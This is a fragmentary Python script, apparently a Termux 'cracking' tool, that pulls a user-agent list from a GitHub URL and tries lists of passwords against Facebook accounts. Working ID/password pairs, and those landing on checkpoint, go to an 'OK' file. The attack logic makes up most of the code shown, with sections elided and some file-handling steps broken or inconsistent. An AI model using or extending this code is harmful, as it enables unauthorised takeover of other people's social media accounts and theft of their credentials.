...
time.sleep(2)
os.system(f'xdg-open https://facebook.com/groups/raihan.king.termux.zone/')
#------------------[ Siam-King ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
princp=[]
try:
    prox= requests.get('https://github.com/siamhossain73/Sex/blob/main/Sex.txt').text
...
def uaku():
    try:
        ua=open('Sex.txt.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/siamhossain73/Sex/blob/main/Sex.txt').text
        ua=open('Sex.txt','w')
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                os.system('espeak -a 300 " Ok,  Siam,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
